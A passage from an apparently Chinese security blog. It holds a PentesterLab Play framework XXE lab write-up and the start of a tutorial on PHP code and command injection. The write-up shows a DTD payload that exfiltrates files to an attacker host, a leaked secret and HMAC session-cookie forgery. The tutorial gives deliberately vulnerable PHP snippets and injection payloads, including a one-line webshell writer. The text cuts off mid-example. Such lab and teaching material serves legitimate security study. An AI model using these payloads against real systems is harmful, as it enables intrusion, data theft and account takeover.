class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;</span><br><span class=\"line\">%p2;</span><br></pre></td></tr></table></figure>\n<p>burp再次发生之前的请求，本地服务器能监听到:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /test.dtd HTTP/1.1&quot; 200 -</span><br><span class=\"line\">10.211.55.14 - - [21/Apr/2017 11:54:10] code 404, message File not found</span><br><span class=\"line\">10.211.55.14 - - [21/Apr/2017 11:54:10] &quot;GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>\n<p>显然，成功读取目标服务器<code>/etc/passwd</code>文件内容，接着应该去获取<code>secret_url</code>, 那么需要知道目标服务器源码文件的内容，从获取的<code>/etc/passwd</code>文件内容可以发现用户<code>play</code>的路径为<code>/opt/play-2.1.3/xxe/</code>, 那么改变test.dtd，读<code>/opt/play-2.1.3/xxe/</code>目录:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % p1 SYSTEM &quot;file:///opt/play-2.1.3/xxe/&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://10.211.55.2:8000/BLAH?%p1;&apos;&gt;&quot;&gt;</span><br><span class=\"line\">%p2;</span><br></pre></td></tr></table></figure>\n<p>得到如下内容:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.211.55.14 - - [21/Apr/2017 15:21:24] &quot;GET /BLAH?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1&quot; 404 -</span><br><span class=\"line\"></span><br><span class=\"line\"># url decode</span><br><span class=\"line\">.gitignore</span><br><span class=\"line\">.settings</span><br><span class=\"line\">app</span><br><span class=\"line\">conf</span><br><span class=\"line\">logs</span><br><span class=\"line\">project</span><br><span class=\"line\">public</span><br><span class=\"line\">README</span><br><span class=\"line\">RUNNING_PID</span><br><span class=\"line\">target</span><br><span class=\"line\">test</span><br></pre></td></tr></table></figure>\n<p>通常，java框架会有路由配置url映射，那么可以访问<code>/opt/play-2.1.3/xxe/conf/</code>目录(采用和上面相同的方式)，得到如下内容:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.211.55.14 - - [21/Apr/2017 12:56:38] &quot;GET /BLAH?application.conf%0Aevolutions%0Aroutes%0A HTTP/1.1&quot; 404 -</span><br><span class=\"line\"></span><br><span class=\"line\"># url decode</span><br><span class=\"line\">application.conf</span><br><span class=\"line\">evolutions</span><br><span class=\"line\">routes</span><br></pre></td></tr></table></figure>\n<p>在访问<code>routes</code>,有如下内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET     /                           controllers.Application.index()</span><br><span class=\"line\">GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()</span><br><span class=\"line\">GET       /login                   controllers.Application.login</span><br><span class=\"line\">POST      /login                   controllers.Application.login</span><br><span class=\"line\">GET       /logout                  controllers.Application.logout</span><br><span class=\"line\"></span><br><span class=\"line\">GET     /assets/*file               controllers.Assets.at(path=&quot;/public&quot;, file)</span><br></pre></td></tr></table></figure>\n<p>得到secret_url为:<code>0ecf87346b9c0b370f8d63e6e7fed4f0</code>, 访问。</p>\n<img src=\"/2017/04/21/play渗透框架XXE实体攻击/secret.png\">\n<h3 id=\"伪造cookie\"><a href=\"#伪造cookie\" class=\"headerlink\" title=\"伪造cookie\"></a>伪造cookie</h3><p>要实现admin用户登录，要么获取密码或登录绕过，要么利用cookie伪造登录，这里仅探讨伪造cookie登录。要实现cookie的伪造，那么需要知道目标服务器设置session的加密方式，访问<code>/opt/play-2.1.3/xxe/conf/application.conf</code>文件，得到application.secret=<code>&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</code>.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">application.secret=&quot;X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</span><br><span class=\"line\">application.langs=&quot;en&quot;</span><br><span class=\"line\">db.default.driver=com.mysql.jdbc.Driver</span><br><span class=\"line\">db.default.url=&quot;mysql://pentesterlab:pentesterlab@localhost/xxe&quot;</span><br><span class=\"line\">ebean.default=&quot;models.*&quot;</span><br><span class=\"line\">logger.root=ERROR</span><br><span class=\"line\">logger.play=INFO</span><br><span class=\"line\">logger.application=DEBUG</span><br></pre></td></tr></table></figure>\n<p>session的管理在<code>app/controllers/Application.java</code>中（或者.scala）, 核心代码如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User user = User.findByUsername(username);</span><br><span class=\"line\">if (user!=null) &#123;</span><br><span class=\"line\">    if (user.password.equals(md5(username+&quot;:&quot;+password) )) &#123;</span><br><span class=\"line\">      session(&quot;user&quot;,username);</span><br><span class=\"line\">      return redirect(&quot;/&quot;);</span><br></pre></td></tr></table></figure>\n<p>显然，我们要利用<code>user=admin</code>来伪造session.</p>\n<p><code>framework/src/play/src/main/scala/play/api/mvc/Http.scala</code>中：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def encode(data: Map[String, String]): String = &#123;</span><br><span class=\"line\">  val encoded = data.map &#123;</span><br><span class=\"line\">    case (k, v) =&gt; URLEncoder.encode(k, &quot;UTF-8&quot;) + &quot;=&quot; + URLEncoder.encode(v, &quot;UTF-8&quot;)</span><br><span class=\"line\">  &#125;.mkString(&quot;&amp;&quot;)</span><br><span class=\"line\">  if (isSigned)</span><br><span class=\"line\">    Crypto.sign(encoded) + &quot;-&quot; + encoded</span><br><span class=\"line\">  else</span><br><span class=\"line\">    encoded</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可知，session内容的格式为: <code>signature-name1=value1&amp;name2=value2</code>, 其实name1,value1等都经过url编码处理, 其中<code>encoded=name1=value1&amp;name2=value2</code>, <code>signature=Crypto.sign(encoded)</code>。</p>\n<p>加密函数如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def sign(message: String, key: Array[Byte]): String = &#123;</span><br><span class=\"line\">   val mac = Mac.getInstance(&quot;HmacSHA1&quot;)</span><br><span class=\"line\">   mac.init(new SecretKeySpec(key, &quot;HmacSHA1&quot;))</span><br><span class=\"line\">   Codecs.toHexString(mac.doFinal(message.getBytes(&quot;utf-8&quot;)))</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>其中<code>key= &quot;[KEY FOUND IN conf/application.conf]&quot;</code>, 那么利用python伪造session内容，过程如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [<span class=\"number\">1</span>]: <span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">In [<span class=\"number\">6</span>]: <span class=\"keyword\">import</span> hmac</span><br><span class=\"line\">In [<span class=\"number\">9</span>]: key =  <span class=\"string\">\"X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG\"</span></span><br><span class=\"line\">In [<span class=\"number\">10</span>]: data = <span class=\"string\">\"user=admin\"</span></span><br><span class=\"line\">In [<span class=\"number\">11</span>]: h = hmac.new(key, data, hashlib.sha1)</span><br><span class=\"line\"></span><br><span class=\"line\">In [<span class=\"number\">12</span>]: h.hexdigest()</span><br><span class=\"line\">Out[<span class=\"number\">12</span>]: <span class=\"string\">'a5b8363ce748cfbb5d654edc3676d440173b33de'</span></span><br></pre></td></tr></table></figure>\n<p>这里必须使用<code>hmac</code>库，而不能仅仅使用<code>hashlib</code>库来计算sha1, 因为hmac库使用key来生成salt, 然后用<code>hashlib.sha1</code>来计算hash值，而不是直接对<code>key+data</code>生成hash值。</p>\n<p>然后进行cookie伪造，cookie名字就是<code>PLAY_SESSION</code>, burp请求如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET / HTTP/1.1</span><br><span class=\"line\">Host: 10.211.55.14</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 FirePHP/0.7.4</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\">x-insight: activate</span><br><span class=\"line\">Cookie: PLAY_SESSION=&quot;a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin&quot;</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/04/21/play渗透框架XXE实体攻击/admin.png\">\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>XXE注入的本质是网站允许提交xml内容，而后台处理xml时不规范导致存在解析了xml内容中的外部实体。因此，如果网站允许提交xml内容，则可能存在XXE注入漏洞。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://pentesterlab.com/exercises/play_xxe/course\" target=\"_blank\" rel=\"noopener\">https://pentesterlab.com/exercises/play_xxe/course</a></li>\n<li><a href=\"http://www.freebuf.com/vuls/83599.html\" target=\"_blank\" rel=\"noopener\">freebuf Play框架的XML Entity Exploit</a></li>\n<li><a href=\"http://rickgray.me/2015/06/08/xml-entity-attack-review.html\" target=\"_blank\" rel=\"noopener\">XML实体攻击回顾</a></li>\n</ul>\n","categories":["Web安全"],"tags":["XXE"]},{"title":"PHP代码注入和命令注入","url":"http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/","content":"<h2 id=\"代码注入和命令注入\"><a href=\"#代码注入和命令注入\" class=\"headerlink\" title=\"代码注入和命令注入\"></a>代码注入和命令注入</h2><p>代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>PHP代码</code>执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>系统命令</code>执行。<br>可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。</p>\n<a id=\"more\"></a>\n<h2 id=\"代码注入攻击\"><a href=\"#代码注入攻击\" class=\"headerlink\" title=\"代码注入攻击\"></a>代码注入攻击</h2><p>代码注入攻击一般出现在不安全的使用某些函数，文件包含导致代码注入攻击，反序列化导致的代码注入攻击。</p>\n<h3 id=\"常见的相关函数\"><a href=\"#常见的相关函数\" class=\"headerlink\" title=\"常见的相关函数\"></a>常见的相关函数</h3><p>代码执行函数有: <code>eval</code>, <code>assert</code>, 正则匹配函数:<code>preg_replace</code>, 动态代码执行函数: <code>create_function</code>, <code>call_user_func</code>, <code>call_user_func_array</code>。</p>\n<ul>\n<li>eval</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1. 没有任何过滤</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">\"cmd\"</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">?cmd=phpinfo();</span><br><span class=\"line\">?cmd=fputs(fopen(<span class=\"string\">'test.php'</span>,<span class=\"string\">'w'</span>),<span class=\"string\">'&lt;?php @eval($_POST[test])?&gt;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. addslashes 过滤</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$cmd = @(string)$_GET[<span class=\"string\">\"cmd\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">'$cmd=\"'</span> . addslashes($cmd) . <span class=\"string\">'\";'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># $&#123;$&#123;&#125;&#125; 绕过</span></span><br><span class=\"line\">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3 双引号包含过滤</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$cmd = <span class=\"string\">\"echo \\\"hello \"</span> . $_GET[<span class=\"string\">'cmd'</span>] . <span class=\"string\">\"\\\";\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">eval</span>($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># $&#123;$&#123;&#125;&#125; 绕过</span></span><br><span class=\"line\">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><code>${${}} 绕过</code>是利用可变变量的二次嵌套，执行里面花括号内的代码，如: <code>echo &quot;${${phpinfo()}}&quot;;</code>, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。</p>\n<p>PHP可变变量可以无需二次嵌套，一次也可以执行，<code>echo &quot;${phpinfo()}&quot;;</code>这种情况是不能执行的，而<code>echo &quot;${/**/phpinfo()}&quot;;</code>是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，<code>空格，tab，注释，回车</code>是各种语法分析引擎中常见的分割字符，<code>@</code>是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong> php &gt;= 4.3 </strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"$&#123; phpinfo()&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"$&#123;    phpinfo()&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"$&#123;/**/phpinfo()&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"$&#123;</span></span><br><span class=\"line\"><span class=\"string\">phpinfo()&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"$&#123;@phpinfo()&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"$&#123;( string )phpinfo()&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"$&#123;phpinfo[phpinfo()]&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"&#123;$phpinfo[phpinfo()]&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"&#123;$&#123;phpinfo()&#125;&#125;\"</span>;</span><br><span class=\"line\"><span class=\"string\">\"$&#123;$&#123;phpinfo()&#125;&#125;\"</span>;</span><br></pre></td></tr></table></figure>\n<p><strong> 更新：php&gt;=5.5 </strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"$&#123;phpinfo()&#125;\"</span>;</span><br></pre></td></tr></table></figure>\n<p>执行phpinfo().</p>\n<ul>\n<li>assert</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@assert($_GET[<span class=\"string\">\"cmd\"</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">cmd=phpinfo();</span><br></pre></td></tr></table></figure>\n<h4 id=\"preg-replace\"><a href=\"#preg-replace\" class=\"headerlink\" title=\"preg_replace\"></a>preg_replace</h4><p>preg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions) 中的e(PREG_REPLACE_EVAL)选项，<br>这个选项会把replacement中的内容当做PHP代码执行，并取返回结果的值，其中后项引用可以是<code>$1</code>，也可以是<code>\\\\1</code>。<br>当replacement 参数构成一个合理的php 代码字符串的时候，<code>/e</code> 修正符使preg_replace()，将replacement 参数当做php 代码执行。</p>\n<ul>\n<li>第一个参数 pattern的代码注入</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># magic_quotes_gpc=Off时，导致代码执行。</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$regexp = $_GET[<span class=\"string\">'reg'</span>];</span><br><span class=\"line\">$var = <span class=\"string\">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/&lt;php&gt;(.*?)$regexp\"</span>, <span class=\"string\">'\\\\1'</span>, $var);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>提交：<code>reg=%3C\\/php%3E/e</code>, 执行 phpinfo(), 即pattern参数注入<code>/e</code>修正符。</p>\n<p>一般情况是不会有<code>e</code>选项的，我们可以通过<code>%00</code>截断等方式来添加</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$regexp = $_GET[<span class=\"string\">'re'</span>];  </span><br><span class=\"line\">$var = <span class=\"string\">'&lt;tag&gt;phpinfo()&lt;/tag&gt;'</span>;  </span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/&lt;tag&gt;(.*?)$regexp&lt;\\/tag&gt;/\"</span>, <span class=\"string\">'\\\\1'</span>, $var);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>提交：<code>reg=%3C\\/php%3E/e%00</code>.</p>\n<ul>\n<li>第二个参数replacement</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># /e 修正符使preg_replace()，将replacement 参数当做php 代码执行</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">preg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>提交:<code>cmd=phpinfo()</code></p>\n<ul>\n<li>第三个参数</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/\\s*\\[php\\](.+?)\\[\\/php\\]\\s*/ies\"</span>, <span class=\"string\">\"\\\\1\"</span>, $_GET[<span class=\"string\">'h'</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>提交：<code>h=[php]phpinfo()[/php]</code>。</p>\n<h4 id=\"其他函数\"><a href=\"#其他函数\" class=\"headerlink\" title=\"其他函数\"></a>其他函数</h4><ul>\n<li>array_map</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$evil_callback = $_GET[<span class=\"string\">'callback'</span>];</span><br><span class=\"line\">$some_array = <span class=\"keyword\">array</span>(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">$new_array = array_map($evil_callback, $some_array);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>提交 <code>http://127.0.0.1/array_map.php?callback=phpinfo</code>, 即执行<code>phpinfo()</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_map()</span><br><span class=\"line\">usort(), uasort(), uksort()</span><br><span class=\"line\">array_filter()</span><br><span class=\"line\">array_reduce()</span><br><span class=\"line\">array_diff_uassoc(), array_diff_ukey()</span><br><span class=\"line\">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</span><br><span class=\"line\">array_intersect_assoc(), array_intersect_uassoc()</span><br><span class=\"line\">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</span><br><span class=\"line\">array_walk(), array_walk_recursive()</span><br><span class=\"line\">xml_set_character_data_handler()</span><br><span class=\"line\">xml_set_default_handler()</span><br><span class=\"line\">xml_set_element_handler()</span><br><span class=\"line\">xml_set_end_namespace_decl_handler()</span><br><span class=\"line\">xml_set_external_entity_ref_handler()</span><br><span class=\"line\">xml_set_notation_decl_handler()</span><br><span class=\"line\">xml_set_processing_instruction_handler()</span><br><span class=\"line\">xml_set_start_namespace_decl_handler()</span><br><span class=\"line\">xml_set_unparsed_entity_decl_handler()</span><br><span class=\"line\">stream_filter_register()</span><br><span class=\"line\">set_error_handler()</span><br><span class=\"line\">register_shutdown_function()</span><br><span class=\"line\">register_tick_function()</span><br></pre></td></tr></table></figure>\n<h3 id=\"文件包含导致代码注入攻击\"><a href=\"#文件包含导致代码注入攻击\" class=\"headerlink\" title=\"文件包含导致代码注入攻击\"></a>文件包含导致代码注入攻击</h3><p>PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: <code>allow_url_fopen=On</code>, <code>allow_url_include=On</code>, 文件包含相关函数有: <code>include</code>, <code>include_once</code>, <code>require</code>, <code>require_once</code>。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>提交：<code>cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E</code>, 即执行phpinfo()。</p>\n<h3 id=\"反序列化导致的代码注入攻击\"><a href=\"#反序列化导致的代码注入攻击\" class=\"headerlink\" title=\"反序列化导致的代码注入攻击\"></a>反序列化导致的代码注入攻击</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Example</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $var = <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"keyword\">$this</span>-&gt;var);</span><br><span class=\"line\">    &#125;</span><br><span 